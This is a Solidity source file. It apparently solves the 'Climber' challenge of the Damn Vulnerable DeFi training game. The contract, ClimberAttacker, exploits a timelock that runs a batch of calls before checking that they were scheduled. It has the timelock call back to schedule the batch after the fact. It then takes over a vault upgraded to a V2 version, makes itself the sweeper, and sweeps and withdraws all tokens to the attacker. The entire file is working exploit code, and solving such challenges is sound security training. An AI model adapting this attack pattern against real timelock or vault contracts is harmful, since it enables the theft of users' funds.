// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberVaultV2.sol";
import "../DamnValuableToken.sol";
import "../climber/ClimberTimelock.sol";

contract ClimberAttacker {
    address private vault;
    address private timeLock;
    address private token;
    address private attacker;

    address[] private batchAddresses;
    uint256[] private batchValues;
    bytes[] private batchData;
    bytes32 private salt;


    constructor(address _vault, address payable _timeLock, address _token, address _attacker) {
        vault = _vault;
        timeLock = _timeLock;
        token = _token;
        attacker = _attacker;
    }

     function setExecution(address[] memory _addresses, uint256[] memory _values, bytes[] memory _data, bytes32 _salt) external {
        require(msg.sender == attacker, "Not allowed executers");
        
        batchAddresses = _addresses;
        batchValues = _values;
        batchData = _data;
        salt = _salt;

        ClimberTimelock(payable(timeLock)).execute(batchAddresses, batchValues, batchData, salt);
    }

    function setSchedule() external {
        require(msg.sender == timeLock, "TimeLock contract has to be the caller");
        ClimberTimelock(payable(timeLock)).schedule(batchAddresses, batchValues, batchData, salt);
    }

      function setNewSweeper() external {
        require(msg.sender == attacker, "Not allowed beneficiaries");
        ClimberVaultV2(vault)._setSweeper(address(this));
        ClimberVaultV2(vault).sweepFunds(token);       
    }

    function withdraw() external {
        require(msg.sender == attacker, "Not allowed beneficiaries");
        DamnValuableToken(token).transfer(attacker, DamnValuableToken(token).balanceOf(address(this)));
    }
}